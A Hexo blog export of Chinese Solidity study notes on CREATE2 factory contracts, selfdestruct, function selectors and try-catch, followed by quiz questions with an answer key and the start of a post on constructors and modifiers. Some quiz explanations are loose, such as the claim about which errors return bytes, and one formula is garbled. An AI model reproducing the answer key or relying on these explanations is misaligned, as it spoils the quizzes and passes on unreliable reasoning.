<h2 id="Create"><a href="#Create" class="headerlink" title="Create"></a>Create</h2><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//new一个合约，并传入新合约构造函数所需的参数</span><br><span class="line"></span><br><span class="line">Contract x = new Contract&#123;value:_value&#125;(params)</span><br><span class="line"></span><br><span class="line">//其中Contract是要创建的合约名，x是合约对象（地址），如果构造函数是payable，可以创建时转入_value数量的ETH，params是新合约构造函数的参数</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Create2"><a href="#Create2" class="headerlink" title="Create2"></a>Create2</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>​	<strong>让合约地址独立于未来的事件</strong></p>
<p>​	不管未来区块链上发生了什么，你都可以把合约部署在事先计算好的地址上。用<strong>CREATE2</strong>创建的合约地址由4个部分决定：</p>
<p>·      <strong>0xFF：一个常数，避免和CREATE冲突</strong></p>
<p><strong>·      CreatorAddress: 调用 CREATE2 的当前合约（创建合约）地址。</strong></p>
<p><strong>·      salt（盐）：一个创建者指定的bytes32类型的值，它的主要目的是用来影响新创建的合约的地址。</strong></p>
<p><strong>·      initcode: 新合约的初始字节码（合约的Creation Code和构造函数的参数）。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">新地址 = hash(&quot;0xFF&quot;,创建者地址, salt, initcode)</span><br></pre></td></tr></table></figure>



<h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a><strong>如何使用</strong></h3><p>CREATE2的用法和之前讲的CREATE类似，同样是new一个合约，并传入新合约构造函数所需的参数，<strong>只不过要多传一个salt参数</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Contract x = new Contract&#123;salt: _salt, value: _value&#125;(params)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//其中Contract是要创建的合约名，x是合约对象（地址），_salt是指定的盐；如果构造函数是payable，可以创建时转入_value数量的ETH，params是新合约构造函数的参数。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="构建工厂合约2"><a href="#构建工厂合约2" class="headerlink" title="构建工厂合约2"></a>构建工厂合约2</h3> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract PairFactory2&#123;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; address)) public getPair; // 通过两个代币地址查Pair地址</span><br><span class="line">    address[] public allPairs; // 保存所有Pair地址</span><br><span class="line"></span><br><span class="line">    function createPair2(address tokenA, address tokenB) external returns (address pairAddr) &#123;</span><br><span class="line">        require(tokenA != tokenB, &#x27;IDENTICAL_ADDRESSES&#x27;); //避免tokenA和tokenB相同产生的冲突</span><br><span class="line">        // 用tokenA和tokenB地址计算salt</span><br><span class="line">        (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序</span><br><span class="line">        bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">        // 用create2部署新合约</span><br><span class="line">        Pair pair = new Pair&#123;salt: salt&#125;(); </span><br><span class="line">        // 调用新合约的initialize方法</span><br><span class="line">        pair.initialize(tokenA, tokenB);</span><br><span class="line">        // 更新地址map</span><br><span class="line">        pairAddr = address(pair);</span><br><span class="line">        allPairs.push(pairAddr);</span><br><span class="line">        getPair[tokenA][tokenB] = pairAddr;</span><br><span class="line">        getPair[tokenB][tokenA] = pairAddr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>工厂合约（PairFactory2）有两个状态变量getPair是两个代币地址到币对地址的map，方便根据代币找到币对地址；allPairs是币对地址的数组，存储了所有币对地址。</p>
<p>PairFactory2合约只有一个createPair2函数，使用CREATE2根据输入的两个代币地址tokenA和tokenB来创建新的Pair合约。其中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pair pair = new Pair&#123;salt: salt&#125;(); </span><br></pre></td></tr></table></figure>



<p>就是利用<strong>CREATE2</strong>创建合约的代码，非常简单，<strong>而salt为token1和token2的hash：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(</span><br><span class="line">                bytes1(0xff),</span><br><span class="line">                address(this),</span><br><span class="line">                salt,</span><br><span class="line">                keccak256(abi.encodePacked(type(Pair).creationCode, abi.encode(address(this))))</span><br><span class="line">            )))));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/11/19/eql9IWNVREGadJj.png" alt="3.png"></p>
<h3 id="实际应用场景"><a href="#实际应用场景" class="headerlink" title="实际应用场景"></a>实际应用场景</h3><ol>
<li>交易所为新用户预留创建钱包合约地址。</li>
<li>由 CREATE2 驱动的 factory 合约，在Uniswap V2中交易对的创建是在 Factory中调用CREATE2完成。这样做的好处是: 它可以得到一个确定的pair地址, 使得 Router中就可以通过 (tokenA, tokenB) 计算出pair地址, 不再需要执行一次 Factory.getPair(tokenA, tokenB) 的跨合约调用。</li>
</ol>
<h2 id="selfdestruct"><a href="#selfdestruct" class="headerlink" title="selfdestruct"></a>selfdestruct</h2><ul>
<li><p>selfdestruct命令可以用来删除智能合约，并将该合约剩余ETH转到指定地址。</p>
</li>
<li><p>不建议使用</p>
</li>
</ul>
<p>目前来说：</p>
<ol>
<li>已经部署的合约无法被<strong>SELFDESTRUCT</strong>了。</li>
<li>如果要使用原先的<strong>SELFDESTRUCT</strong>功能，必须在同一笔交易中创建并<strong>SELFDESTRUCT</strong></li>
</ol>
<h3 id="如何使用-1"><a href="#如何使用-1" class="headerlink" title="如何使用"></a>如何使用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">selfdestruct(_addr)；</span><br></pre></td></tr></table></figure>

<p>其中_addr是接收合约中剩余ETH的地址。_addr 地址不需要有receive()或fallback()也能接收ETH</p>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a><strong>注意事项</strong></h3><ol>
<li><p>对外提供合约销毁接口时，最好设置为只有合约所有者可以调用，可以使用函数修饰符<strong>onlyOwner</strong>进行函数声明。</p>
</li>
<li><p>当合约中有<strong>selfdestruct</strong>功能时常常会带来安全问题和信任问题，合约中的selfdestruct功能会为攻击者打开攻击向量(例如使用<strong>selfdestruct</strong>向一个合约频繁转入token进行攻击，这将大大节省了GAS的费用，虽然很少人这么做)，此外，此功能还会降低用户对合约的信心。</p>
</li>
</ol>
<h2 id="函数选择器Selector"><a href="#函数选择器Selector" class="headerlink" title="函数选择器Selector"></a>函数选择器Selector</h2><p><img src="https://s2.loli.net/2024/11/19/nYUMNWopbgLalG9.png" alt="4.png"></p>
<h3 id="msg-data"><a href="#msg-data" class="headerlink" title="msg.data"></a><strong>msg.data</strong></h3><p><strong>msg.data</strong>是<strong>Solidity</strong>中的一个全局变量，值为完整的<strong>calldata</strong>（调用函数时传入的数据</p>
<p>举例: </p>
<p>当参数为<code>0x2c44b726ADF1963cA47Af88B284C06f30380fC78</code>时，输出的<code>calldata</code>为</p>
<p><code>0x6a6278420000000000000000000000002c44b726adf1963ca47af88b284c06f30380fc78</code></p>
<p><strong>这段很乱的字节码可以分成两部分：</strong></p>
<p>前4个字节为函数选择器selector：<br> 0x6a627842</p>
<p> 后面32个字节为输入的参数：<br> <code>0x0000000000000000000000002c44b726adf1963ca47af88b284c06f30380fc78</code></p>
<p>其实<strong>calldata</strong>就是告诉智能合约，我要调用哪个函数，以及参数是什么。</p>
<h3 id="method-id、selector和函数签名"><a href="#method-id、selector和函数签名" class="headerlink" title="method id、selector和函数签名"></a><strong>method id、selector和函数签名</strong></h3><p><strong>method id定义为函数签名的Keccak哈希后的前4个字节，当selector与method id相匹配时，即表示调用该函数，那么函数签名是什么？</strong>**</p>
<p>简单介绍函数签名: 为**”函数名（逗号分隔的参数类型)”<strong>。举个例子，上面代码中</strong>mint<strong>的函数签名为</strong>“mint(address)”**。在同一个智能合约中，不同的函数有不同的函数签名，因此我们可以通过函数签名来确定要调用哪个函数。</p>
<p><strong>注意，在函数签名中，uint和int要写为uint256和int256。</strong></p>
<p>由于计算method id时，需要通过函数名和函数的参数类型来计算。</p>
<p><strong>在Solidity中，函数的参数类型主要分为：基础类型参数，固定长度类型参数，可变长度类型参数和映射类型参数。</strong></p>
<ol>
<li>基础类型参数</li>
</ol>
<p>solidity中，基础类型的参数有：uint256(uint8, … , uint256)、bool, address等。在计算method id时，只需要计算<code>bytes4(keccak256(&quot;函数名(参数类型1,参数类型2,...)&quot;))</code></p>
<ol start="2">
<li>固定长度类型参数</li>
</ol>
<p>通常为固定长度的数组，例如：uint256[5]等因此，在计算该函数的method id时，只需要通过<code>bytes4(keccak256(&quot;fixedSizeParamSelector(uint256[3])&quot;))</code></p>
<p>即可。</p>
<ol start="3">
<li>可变长度类型参数</li>
</ol>
<p>通常为可变长的数组，例如：address[]、uint8[]、string等，</p>
<p>因此在计算该函数的method id时，只需要通过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes4(keccak256(&quot;nonFixedSizeParamSelector(uint256[],string)&quot;))</span><br></pre></td></tr></table></figure>

<p>即可。</p>
<ol start="4">
<li>映射类型参数</li>
</ol>
<p>映射类型参数通常有：contract、enum、struct等。在计算method id时，需要将该类型转化成为ABI类型。因此，计算该函数的<strong>method id</strong>的代码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes4(keccak256(&quot;mappingParamSelector(address,(uint256,bytes),uint256[],uint8)&quot;))</span><br></pre></td></tr></table></figure>





<h3 id="使用selector"><a href="#使用selector" class="headerlink" title="使用selector"></a><strong>使用selector</strong></h3><p>我们可以利用<strong>selector</strong>来调用目标函数。例如我想调用<strong>elementaryParamSelector</strong>函数，我只需要利用<strong>abi.encodeWithSelector</strong>将<strong>elementaryParamSelector</strong>函数的<strong>method id</strong>作为<strong>selector</strong>和参数打包编码，传给<strong>call</strong>函数：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//使用selector来调用函数</span><br><span class="line">   function callWithSignature() external&#123;</span><br><span class="line">   ...</span><br><span class="line">     //调用elementaryParamSelector函数</span><br><span class="line">     (bool success1, bytes memory data1) = address(this).call(abi.encodeWithSelector(0x3ec37834, 1, 0));</span><br><span class="line">   ...</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>





<h2 id="try-Catch"><a href="#try-Catch" class="headerlink" title="try Catch"></a>try Catch</h2><p>在 Solidity 中，try-catch 可以用来捕获以下几种异常：</p>
<ul>
<li>**revert()**：手动触发的异常，通常用于返回自定义错误消息。</li>
<li>**require()**：检查条件，如果条件不满足则触发异常，通常用于输入验证和状态检查。</li>
<li>**assert()**：用于检查不变量（internal     consistency），如果条件不满足会触发异常，并消耗所有剩余的 gas。这种异常通常表示程序中有严重错误。</li>
</ul>
<p>因此，try-catch 可以捕获 <strong>以上所有异常</strong>，但前提是它们发生在<strong>外部调用</strong>时。例如，当调用另一个合约或使用低级调用时发生异常，try-catch 可以捕获这些错误。</p>
<p><strong>try-catch</strong>只能被用于external函数或创建合约时constructor（被视为external函数）的调用。基本语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try externalContract.f() &#123;</span><br><span class="line">   //call成功的情况下 运行一些代码</span><br><span class="line"> &#125; catch &#123;</span><br><span class="line">   // call失败的情况下 运行一些代码</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



<p>其中externalContract.f()是某个外部合约的函数调用，try模块在调用成功的情况下运行，而catch模块则在调用失败时运行。</p>
<p>同样可以使用this.f()来替代externalContract.f()，this.f()也被视作为外部调用，但不可在构造函数中使用，因为此时合约还未创建。</p>
<p>如果调用的函数有返回值，那么必须在<strong>try</strong>之后声明<strong>returns(returnType val)<strong>，并且在</strong>try</strong>模块中可以使用返回的变量；如果是创建合约，那么返回值是新创建的合约变量。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try externalContract.f() returns(returnType val)&#123;</span><br><span class="line">   // call成功的情况下 运行一些代码</span><br><span class="line"> &#125; catch &#123;</span><br><span class="line">   // call失败的情况下 运行一些代码</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>另外，<strong>catch</strong>模块支持捕获特殊的异常原因：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try externalContract.f() returns(returnType)&#123;</span><br><span class="line"></span><br><span class="line">  // call成功的情况下 运行一些代码</span><br><span class="line"></span><br><span class="line">&#125; catch Error(string memory /*reason*/ ) &#123;</span><br><span class="line"></span><br><span class="line">  // 捕获revert(&quot;reasonString&quot;) 和 require(false, &quot;reasonString&quot;)</span><br><span class="line"></span><br><span class="line">&#125; catch Panic(uint /*errorCode*/) &#123;</span><br><span class="line"></span><br><span class="line">  // 捕获Panic导致的错误 例如assert失败 溢出 除零 数组访问越界</span><br><span class="line"></span><br><span class="line">&#125; catch (bytes memory /*lowLevelData*/) &#123;</span><br><span class="line"></span><br><span class="line">  // 如果发生了revert且上面2个异常类型匹配都失败了 会进入该分支</span><br><span class="line"></span><br><span class="line">  // 例如revert() require(false) revert自定义类型的error</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h2><ul>
<li>在代理合约中，存储所有相关的变量的是（），存储所有函数的是（），同时（）</li>
</ul>
<p>选择一个答案 </p>
<p>A. 代理合约; 逻辑合约; 代理合约delegatecall逻辑合约 </p>
<p>B. 代理合约; 逻辑合约; 逻辑合约delegatecall代理合约 </p>
<p>C. 逻辑合约; 代理合约; 代理合约delegatecall逻辑合约</p>
<p>D. 逻辑合约; 代理合约; 逻辑合约delegatecall代理合约</p>
<p><strong>解析</strong></p>
<p><strong>在代理合约模式中，通常有两个主要组成部分：代理合约和逻辑合约。它们的职责分配如下：</strong></p>
<ol>
<li><strong>代理合约 存储所有相关的变量：</strong></li>
</ol>
<p><strong>代理合约负责持有合约的状态（即存储变量）。这意味着合约的状态信息保存在代理合约中。</strong></p>
<ol start="2">
<li><strong>逻辑合约 存储所有函数：</strong></li>
</ol>
<p><strong>逻辑合约包含具体的业务逻辑和函数实现。它不直接持有状态，而是通过 delegatecall 被代理合约调用。</strong></p>
<ol start="3">
<li><strong>代理合约使用 delegatecall 调用逻辑合约：</strong></li>
</ol>
<p><strong>代理合约使用 delegatecall 调用逻辑合约中的函数。在这种调用方式下，逻辑合约中的代码在代理合约的上下文中执行，这意味着逻辑合约可以通过代理合约的状态变量进行操作。</strong></p>
<p><strong>因此，选项 A 是正确的，因为它准确地描述了代理合约和逻辑合约之间的关系和它们各自的职责。</strong></p>
<hr>
<ul>
<li><p>使用delegatecall对当前合约和目标合约的状态变量有什么要求？</p>
<p>选择一个答案</p>
<p>A. 变量名、变量类型、声明顺序都必须相同</p>
<p>B. 变量名可以不同，变量类型、声明顺序必须相同</p>
<p>C. 变量类型可以不同，变量名、声明顺序必须相同</p>
<p>D. 声明顺序可以不同，变量名、变量类型必须相同</p>
</li>
</ul>
<p><strong>解析</strong></p>
<ol>
<li><strong>状态变量在 delegatecall 中的作用</strong>：</li>
</ol>
<p>o 当使用 delegatecall 调用目标合约的函数时，该函数的执行是在调用合约的存储上下文中进行的。这意味着目标合约中使用的状态变量会直接影响调用合约中的状态变量。</p>
<ol start="2">
<li><strong>变量名</strong>：</li>
</ol>
<p>o 变量名可以不同，这是因为在调用时，delegatecall 是根据存储位置而不是变量名来访问状态变量。只要存储顺序和类型匹配，变量名的不同不会影响操作。</p>
<ol start="3">
<li><strong>变量类型</strong>：</li>
</ol>
<p>o 变量类型必须相同，因为 delegatecall 需要确保数据的正确解码和存储。若目标合约中使用的变量类型与调用合约的状态变量类型不一致，将导致数据解码错误，从而引发异常。</p>
<ol start="4">
<li><strong>声明顺序</strong>：</li>
</ol>
<p>声明顺序必须相同，这是因为 Solidity 编译器在生成合约存储布局时是基于变量声明的顺序来分配存储位置的。如果顺序不同，虽然变量名可以不同，但不同的顺序会导致访问错误的数据位置</p>
<p>综上：选B</p>
<hr>
<ul>
<li>1个工厂合约PairFactory创建Pair合约的最大数量一般由什么决定？</li>
</ul>
<p>选择一个答案</p>
<p>A. 1个PairFactory只能创建1个pari合约</p>
<p>B. Pair合约逻辑</p>
<p>C. PairFactory合约逻辑</p>
<p><strong>解析</strong></p>
<p><strong>在 Solidity 中，工厂合约（如 PairFactory）的作用通常是用于批量创建和管理其他合约实例（例如 Pair 合约）。工厂合约能够创建的合约数量主要取决于工厂合约自身的逻辑。也就是说，PairFactory 中的代码决定了它创建 Pair 合约的具体规则和限制，例如是否允许创建多个 Pair 实例，或对创建数量施加其他限制。</strong></p>
<ul>
<li><strong>A. 1个PairFactory只能创建1个pair合约：不正确。工厂合约一般可以创建多个合约实例，具体数量取决于其逻辑实现。</strong></li>
<li><strong>B. Pair合约逻辑：不正确。Pair 合约的逻辑通常只影响其自身的行为和状态，而不是 PairFactory 合约创建 Pair 合约的数量。</strong></li>
<li><strong>C. PairFactory合约逻辑：正确。工厂合约的逻辑直接决定了它可以创建多少个 Pair 合约实例。</strong></li>
</ul>
<p><strong>因此，答案是 C。</strong></p>
<hr>
<ul>
<li>删除合约时，可以将合约中剩余的ETH发送出去： 选择一个答案 A. 正确 B. 错误</li>
</ul>
<p><strong>解析</strong></p>
<p><strong>在 Solidity 中使用 selfdestruct 删除合约时，可以将合约中剩余的 ETH 发送到指定的地址。selfdestruct(address payable recipient) 会销毁合约并将其剩余余额发送给 recipient 地址。因此，删除合约时确实可以将合约中的剩余 ETH 发送出去，选A。</strong></p>
<hr>
<ul>
<li><p>当我们调用智能合约时，传递给合约的数据的前若干个字节被称为“函数选择器 (Selector)”，它告诉合约我们想要调用哪个函数。假设我们想要调用的函数在智能合约中定义声明如下： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">solidity Copy code function foo(uint256 n, address sender, string s) public view returns(bool b) </span><br></pre></td></tr></table></figure>

<p>那么该函数对应的函数选择器为： 选择一个答案 </p>
<p>A.<code> &quot;foo(uint256,address,string)&quot;</code></p>
<p>B. <code>&quot;foo(uint256 n, address sender, string s)&quot; </code></p>
<p>C. <code>keccak256(&quot;foo(uint256,address,string)&quot;) </code></p>
<p>D.<code>keccak256(&quot;foo(uint256 n, address sender, string s)&quot;)</code></p>
<p>E. <code>bytes4(keccak256(&quot;foo(uint256,address,string)&quot;)) </code></p>
<p>F. <code>bytes4(keccak256(&quot;foo(uint256 n, address sender, string s)&quot;))</code></p>
</li>
</ul>
<p><strong>解析</strong></p>
<p><strong>在 Solidity 中，函数选择器是由函数签名（函数名称和参数类型）经过 Keccak-256 哈希运算后生成的前 4 个字节。具体生成步骤如下：</strong></p>
<p><strong>1.</strong>   <strong>将函数的签名（包括函数名称和参数类型，但不包含参数名称）传入 keccak256 进行哈希计算。</strong></p>
<p>在这个例子中，函数签名为 <code>&quot;foo(uint256,address,string)&quot;</code></p>
<p><strong>2.</strong>   <strong>取 keccak256 哈希结果的前 4 个字节，形成 bytes4 类型的数据。</strong></p>
<p><strong>因此，正确答案是 bytes4(keccak256(“foo(uint256,address,string)”))。</strong></p>
<hr>
<ul>
<li><p>已知函数foo在智能合约中定义声明如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">solidity Copy code function foo(uint256 a) public view</span><br></pre></td></tr></table></figure>



<p> 而字符串<code>&quot;foo(uint256)&quot;</code>的keccak256哈希值为： <code>0x2fbebd3821c4e005fbe0a9002cc1bd25dc266d788dba1dbcb39cc66a07e7b38b</code> 那么，当我们希望调用函数foo()时，以下生成调用数据的写法中，正确且最节省gas的一项是： 选择一个答案</p>
<p> A.<code> abi.encodeWithSignature(&quot;foo(uint256)&quot;, a)</code> B.<code>abi.encodeWithSelector(&quot;foo(uint256)&quot;, a)</code></p>
<p>C.<code>abi.encodeWithSelector(bytes(keccak256(&quot;foo(uint256)&quot;)), a) </code></p>
<p>D. <code>abi.encodeWithSelector(bytes4(0x2fbebd38), a)</code></p>
</li>
</ul>
<p><strong>解析：</strong></p>
<p>·    <strong>在 Solidity 中，调用函数时可以通过函数的选择器（selector）生成调用数据。</strong></p>
<p>·    <strong>题目中已给出 “foo(uint256)” 的哈希值为 0x2fbebd3821c4e005fbe0a9002cc1bd25dc266d788dba1dbcb39cc66a07e7b38b，而选择器就是这个哈希值的前四个字节，即 0x2fbebd38。</strong></p>
<p>·    <strong>选项 D 使用了 abi.encodeWithSelector(bytes4(0x2fbebd38), a)，直接利用已知的选择器生成调用数据，这是最节省 gas 的写法，因为它避免了重复计算哈希值。</strong></p>
<p><strong>其他选项分析：</strong></p>
<p>·    <strong>A</strong> <strong>和 B 会导致额外的 gas 开销，因为它们需要在运行时计算 “foo(uint256)” 的哈希值。</strong></p>
<p>·    <strong>C</strong> <strong>中的 keccak256(“foo(uint256)”) 也会增加不必要的计算，因此会消耗更多的 gas。</strong></p>
<p><strong>正确答案选D</strong></p>
<hr>
<ul>
<li>如果对于某个哈希函数，我们统计大量不同字符串对应的哈希值（二进制串），发现其前 n 位全部为 0 的频率恰好约为 1&#x2F;2^n，则我们认为该哈希函数具有良好的：</li>
</ul>
<p> 选择一个答案 </p>
<p>A. 单向性 </p>
<p>B. 灵敏性 </p>
<p>C. 高效性 </p>
<p>D. 均一性 </p>
<p>E. 抗碰撞性</p>
<p><strong>解析</strong>：</p>
<p><strong>·    均一性（Uniformity）指的是哈希函数生成的哈希值在输出空间中均匀分布。若哈希函数具有均一性，则任意特定模式（如前 n 位为 0）在随机情况下出现的概率为 12n\frac{1}{2^n}2n1。</strong></p>
<p><strong>·    题目中的现象描述了哈希值分布的均匀性，符合均一性的定义。</strong></p>
<p><strong>其他选项分析：</strong></p>
<p><strong>·    单向性 是指给定哈希值很难逆向推出原始输入。</strong></p>
<p><strong>·    灵敏性 是指输入的细微变化（例如一位改变）会显著改变输出（哈希值）。</strong></p>
<p><strong>·    高效性 指的是哈希函数计算的速度。</strong></p>
<p><strong>·    抗碰撞性 是指很难找到不同输入生成相同的哈希值。</strong></p>
<p><strong>因此，D. 均一性 是最符合题意的选项。</strong></p>
<hr>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address recipient, uint amount) external override returns (bool) &#123;</span><br><span class="line"></span><br><span class="line">	balanceOf[msg.sender] -= amount;</span><br><span class="line"></span><br><span class="line">	balanceOf[recipient] += amount;</span><br><span class="line"></span><br><span class="line">	emit Transfer(msg.sender, recipient, amount);</span><br><span class="line"></span><br><span class="line">	return true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>transfer</strong>函数的函数签名是transfer(address uint256)</p>
<p><strong>transfer</strong>函数的选择器为0xa9059cbb</p>
<p><strong>解析</strong></p>
<p><strong>通过计算 keccak256(“transfer(address,uint256)”) 得到</strong></p>
<p>计算代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SelectorCalculator &#123;</span><br><span class="line">    function getTransferSelector() public pure returns (bytes4) &#123;</span><br><span class="line">        return bytes4(keccak256(&quot;transfer(address,uint256)&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<hr>
<ul>
<li>try-catch捕获到异常后是否会使try-catch所在的方法调用失败？</li>
</ul>
<p>选择一个答案 A. 会 B. 不会</p>
<p><strong>解析</strong></p>
<p> <strong>在 Solidity 中，try-catch 用于捕获外部合约调用或低级调用（如 .call）中可能发生的异常。当 try 块中的调用失败并触发异常时，程序流会进入 catch 块，而不会导致整个 try-catch 所在的函数失败。因此，只要 catch 块正确处理了异常，try-catch 所在的方法可以继续执行，不会因为捕获异常而失败。</strong></p>
<hr>
<ul>
<li>try代码块内的revert是否会被catch本身捕获？</li>
</ul>
<p>A. 会 B. 不会</p>
<p><strong>解析</strong></p>
<p><strong>因为Solidity 中，try-catch 结构用于捕获由外部调用（如其他合约的函数调用或低级调用）引发的异常。然而，try 代码块内部的 revert 并不会被同一 try-catch 结构的 catch 捕获。这是因为：</strong></p>
<ul>
<li><strong>try-catch</strong> <strong>只捕获外部合约调用中的异常。如果 try 块内的代码直接调用 revert()，这将导致该函数的整个执行环境被终止，无法进入 catch 块。</strong></li>
<li><strong>换句话说，try-catch 结构设计的目的是为了捕获异常以便处理，而 revert() 直接触发的异常会使当前调用栈中的所有状态都回滚，而不会跳转到 catch 块。</strong></li>
</ul>
<hr>
<ul>
<li>以下异常返回值类型为bytes的是： 选择一个答案 A. revert() B. require() C. assert() D. 以上都是 D是错的</li>
</ul>
<p><strong>解析： 在 Solidity 中，revert() 可以返回一个 bytes 类型的错误信息，例如自定义的错误消息，因此 revert() 的返回值类型为 bytes。这是为了提供详细的错误描述。</strong></p>
<ul>
<li><strong>require()</strong> <strong>和 assert() 通常不返回详细的错误数据，尤其是 assert()，它直接导致系统错误，并消耗所有剩余的 gas，不返回 bytes 类型的错误信息。</strong></li>
</ul>
<p><strong>因此，只有 A. revert() 返回 bytes 类型的错误信息。</strong></p>
]]></content>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>solidity基础002</title>
    <url>/2024/11/11/solidity%E5%9F%BA%E7%A1%80%EF%BC%882%EF%BC%89/</url>
    <content><![CDATA[<p>关键词：constructor&amp;Modifier  event 继承 接口 异常 重载 库合约 引用 回调</p>
<h3 id="构造函数constructor和修饰器Modifier"><a href="#构造函数constructor和修饰器Modifier" class="headerlink" title="构造函数constructor和修饰器Modifier"></a>构造函数constructor和修饰器Modifier</h3><h4 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h4><p>  定义：<strong>是一种特殊函数 每个合约可以定义一个，并且在部署合约时自动运行一次。</strong></p>
<p>可用于初始化合约参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MyToken &#123;</span><br><span class="line">    string public name;</span><br><span class="line">    string public symbol;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    //带参数的构造函数用于初始化状态变量</span><br><span class="line">    constructor(string memory _name, string memory _symbol, uint256 _initialSupply) &#123;</span><br><span class="line">        name = _name;            // Token name</span><br><span class="line">        symbol = _symbol;        // Token symbol</span><br><span class="line">        totalSupply = _initialSupply;  // 设置初始代币供应量</span><br><span class="line">        owner = msg.sender;      // 将部署者设置为合约的拥有者owner</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="Modifier"><a href="#Modifier" class="headerlink" title="Modifier"></a>Modifier</h4><p>定义：<strong>类似于decorator，声明函数拥有的特性，并减少代码冗余</strong></p>
<p>主要使用场景： <strong>运行函数前的检查，例如地址，变量，余额等。</strong></p>
<p>定义一个叫做onlyOwner的modifier：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//定义modifier</span><br><span class="line">modifier onlyOwner&#123;</span><br><span class="line">  require(msg.sender == owner);//检查调用者是否为owner地址</span><br><span class="line">  _;// 如果是的话，继续运行函数主体；否则报错并revert交易</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>带有onlyOwner修饰符的函数只能被owner地址调用</strong></p>
<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//改变owner</span><br><span class="line">function changeOwner(address_newOwner) external onlyOwner&#123;</span><br><span class="line">  owner = _newOwner;// 只能owner地址运行这个函数，并改变owner</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	在以上函数中，由于onlyOwner修饰符的存在，只有原先的owner可以调用，别人调用就会报错。这也是最常用的控制智能合约权限的方法。</p>
<h3 id="事件event"><a href="#事件event" class="headerlink" title="事件event"></a>事件event</h3><ol>
<li><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4></li>
</ol>
<ul>
<li>响应： 应用程序（ether.js)可以通过RPC接口订阅和监听这些事件，并在前端做响应。</li>
<li>经济：事件是<strong>EVM</strong>上比较经济的存储数据的方式，每个大概消耗2,000 <strong>gas</strong>；相比之下，链上存储一个新变量至少需要20,000 <strong>gas</strong>。</li>
</ul>
<ol start="2">
<li><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ul>
<li><strong>日志记录</strong>：事件在链上作为日志记录保存，不能被智能合约读取，但可供外部观察。</li>
<li><strong>通知机制</strong>：前端应用、DApp 等可以监听事件来响应合约的变化，如更新用户余额、确认交易等。</li>
<li><strong>优化 Gas 消耗</strong>：事件的存储成本低于状态变量的修改，因此在某些应用场景下，使用事件记录是更高效的选择。</li>
</ul>
</li>
<li><h4 id="声明事件"><a href="#声明事件" class="headerlink" title="声明事件"></a>声明事件</h4></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Event + 事件名称 + (变量类型 变量名,变量类型 变量名,...)</span><br></pre></td></tr></table></figure>



<p>​	以REC20代币合约的Transfer事件为例：</p>
